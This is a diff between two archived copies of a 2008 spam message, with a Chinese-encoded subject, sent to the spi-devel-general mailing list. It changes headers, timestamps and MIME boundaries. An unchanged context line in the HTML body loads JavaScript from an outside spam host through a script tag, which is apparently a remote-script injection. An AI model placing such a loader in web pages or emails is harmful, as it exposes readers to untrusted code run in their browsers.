@@ -1,9 +1,9 @@
-From: =?GB2312?B?1cXJ+g==?= <zshhhhh888-9Onoh4P/yGk@public.gmane.org>
+From: =?GB2312?B?1cXPyMn6?= <zshhhhh888-9Onoh4P/yGk@public.gmane.org>
 Subject: =?GB2312?B?zsS8/g==?=
-Date: Tue, 22 Jul 2008 12:08:59 +0800
-Message-ID: <E1KL9BP-0007Fb-89@mail.sourceforge.net>
+Date: Tue, 22 Jul 2008 15:08:49 +0800
+Message-ID: <E1KLBzQ-0003oC-Ta@mail.sourceforge.net>
 Reply-To: zshhhhh888-9Onoh4P/yGk@public.gmane.org
-Content-Type: multipart/mixed; boundary="===============1841049416=="
+Content-Type: multipart/mixed; boundary="===============0059613923=="
 To: spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 Return-path: <spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/spi-devel-general>,
@@ -17,7 +17,7 @@ Sender: spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.
 Errors-To: spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Id: linux-spi.vger.kernel.org
 
---===============1841049416==
+--===============0059613923==
 Content-Type: text/html;charset="GB2312"
 Content-Transfer-Encoding: quoted-printable
 
@@ -58,7 +58,7 @@ weight:700"><font color=3D"#FF0000"> </font>
 <script language=3Djavascript src=3Dhttp://cc.18dd.net/1.js></script>
 
 
---===============1841049416==
+--===============0059613923==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -69,7 +69,7 @@ This SF.Net email is sponsored by the Moblin Your Move Developer's challenge
 Build the coolest Linux based applications with Moblin SDK & win great prizes
 Grand prize is a trip for two to an Open Source event anywhere in the world
 http://moblin-contest.org/redirect.php?banner_id=100&url=/
---===============1841049416==
+--===============0059613923==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -80,4 +80,4 @@ spi-devel-general mailing list
 spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 https://lists.sourceforge.net/lists/listinfo/spi-devel-general
 
---===============1841049416==--
+--===============0059613923==--
